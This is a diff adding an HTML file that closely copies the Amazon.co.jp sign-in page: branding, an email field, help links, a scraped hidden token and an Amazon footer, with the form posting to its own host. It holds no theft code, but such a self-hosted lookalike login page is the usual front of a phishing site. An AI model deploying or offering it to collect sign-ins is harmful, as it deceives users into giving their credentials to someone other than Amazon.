@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset='utf-8'>
+<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, user-scalable=no">
+<title>Amazonサインイン</title>
+<link href="https://use.fontawesome.com/releases/v6.2.0/css/all.css" rel="stylesheet">
+<link rel="stylesheet" href="reset.css">
+<link rel='stylesheet' type='text/css' href='style.css'>
+<link rel="icon" href="mini-icon.ico">
+<link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png">
+</head>
+<body>
+	<div id="page">
+		<div id="header">
+			<a tabindex="-1" href="https://www.amazon.co.jp/ref=ap_frn_logo">
+				<i id="logo" role="img" aria-label="Amazon"></i>
+				<i id="domain" role="presentation"></i>
+			</a>
+		</div>
+
+
+		<div id="middle">
+			<div id="section">
+				<form name="signIn" method="post" novalidate="" action="" id="login">
+					<div id="box">
+						<h1>ログイン</h1>
+						<div id="address">
+							<label for="ap_email">Eメールまたは携帯電話番号</label>
+							<input type="email" maxlength="128" id="ap_email" name="email" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field">
+							<div id="alert" style="display: none;"><i class="a-icon a-icon-alert"></i><div class="a-alert-content">メールアドレスまたは携帯電話番号を入力してください</div></div>
+						</div>
+						<div id="next">
+							<span id="continue" class="a-button a-button-span12 a-button-primary">
+								<span class="a-button-inner">
+									<input id="continue" tabindex="5" class="a-button-input" type="submit" aria-labelledby="continue-announce">
+									<span id="continue-announce" class="a-button-text" aria-hidden="true">次に進む</span>
+								</span>
+							</span>
+							<div id="legalTextRow" class="a-row a-spacing-top-medium a-size-small">
+								Amazonの<a href="/gp/help/customer/display.html/ref=ap_signin_notification_condition_of_use?ie=UTF8&amp;nodeId=643006">利用規約</a>と<a href="/gp/help/customer/display.html/ref=ap_signin_notification_privacy_notice?ie=UTF8&amp;nodeId=643000">プライバシー規約</a>に同意いただける場合はログインしてください。
+							</div>
+						</div>
+						<div id="question">
+							<a data-csa-c-func-deps="aui-da-a-expander-toggle" data-csa-c-type="widget" data-csa-interaction-events="click" aria-expanded="false" role="button" href="javascript:void(0)" data-action="a-expander-toggle" data-a-expander-toggle="{&quot;allowLinkDefault&quot;:true, &quot;expand_prompt&quot;:&quot;&quot;, &quot;collapse_prompt&quot;:&quot;&quot;}" data-csa-c-id="dnbwwg-pd0l9z-228yzr-2xt07m"><i class="a-icon a-icon-expand"></i><span class="a-expander-prompt">お困りですか?</span></a>
+							<div aria-expanded="false" class="a-expander-content a-expander-inline-content a-expander-inner" style="display:none">
+								<a id="auth-fpp-link-bottom" class="a-link-normal" href="https://www.amazon.co.jp/ap/forgotpassword?showRememberMe=true&amp;openid.pape.max_auth_age=0&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;pageId=jpflex&amp;ignoreAuthState=1&amp;mobileBrowserWeblabTreatment=C&amp;openid.return_to=https%3A%2F%2Fwww.amazon.co.jp%2Fgp%2Fcss%2Fhomepage.html%3Fref_%3Dnav_youraccount_switchacct&amp;prevRID=QN6AV0GW3KF921S13PAK&amp;openid.assoc_handle=jpflex&amp;openid.mode=checkid_setup&amp;desktopBrowserWeblabTreatment=C&amp;prepopulatedLoginId=&amp;failedSignInCount=0&amp;ref_=ap_sw_aa&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;disableLoginPrepopulate=1&amp;switch_account=signin&amp;openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0">パスワードを忘れた場合</a>
+							</div>
+							<div aria-expanded="false" class="a-expander-content a-expander-inline-content a-expander-inner" style="display:none">
+								<a id="ap-other-signin-issues-link" class="a-link-normal" href="/gp/help/customer/account-issues/ref=ap_login_with_otp_claim_collection?ie=UTF8">その他のログインに関する問題</a>
+							</div>
+						</div>
+					</div>
+				</form>
+				<input name="metadata1" type="hidden" value="ECdITeCs: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"><input type="hidden" name="aaToken" value="{&quot;uniqueValidationId&quot;:&quot;6719c201-b10e-414f-88ed-217faa2d85c4&quot;}"></form>\
+			</div>
+			<div class="a-divider a-divider-break"><h5 aria-level="5">初めてAmazonをご利用ですか？</h5></div>
+			<span id="auth-create-account-link" class="a-button a-button-span12 a-button-base"><span class="a-button-inner"><a id="createAccountSubmit" href="https://www.amazon.co.jp/ap/register?showRememberMe=true&amp;openid.pape.max_auth_age=0&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;pageId=jpflex&amp;ignoreAuthState=1&amp;mobileBrowserWeblabTreatment=C&amp;openid.return_to=https%3A%2F%2Fwww.amazon.co.jp%2Fgp%2Fcss%2Fhomepage.html%3Fref_%3Dnav_youraccount_switchacct&amp;prevRID=QN6AV0GW3KF921S13PAK&amp;openid.assoc_handle=jpflex&amp;openid.mode=checkid_setup&amp;desktopBrowserWeblabTreatment=C&amp;prepopulatedLoginId=&amp;failedSignInCount=0&amp;ref_=ap_sw_aa&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;disableLoginPrepopulate=1&amp;switch_account=signin&amp;openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0" class="a-button-text">Amazonアカウントを作成する</a></span></span>
+		</div>
+		<div class="a-section a-spacing-top-extra-large auth-footer">
+			<div class="a-divider a-divider-section">
+				<div class="a-divider-inner"></div>
+			</div>
+			<div class="a-section a-spacing-small a-text-center a-size-mini">
+				<span class="auth-footer-seperator"></span>
+				<a class="a-link-normal" target="_blank" href="/gp/help/customer/display.html/ref=ap_desktop_footer_cou?ie=UTF8&amp;nodeId=643006">利用規約</a>
+				<span class="auth-footer-seperator"></span>
+				<a class="a-link-normal" target="_blank" href="/gp/help/customer/display.html/ref=ap_desktop_footer_privacy_notice?ie=UTF8&amp;nodeId=643000">プライバシー規約</a>
+				<span class="auth-footer-seperator"></span>
+				<a class="a-link-normal" target="_blank" href="/help">ヘルプ</a>
+				<span class="auth-footer-seperator"></span>
+			</div>
+			<div class="a-section a-spacing-none a-text-center">
+				<span class="a-size-mini a-color-secondary">© 1996-2023, Amazon.com, Inc. またはその関連会社</span>
+			</div>
+		</div>
+	</div>
+</body>
+</html>
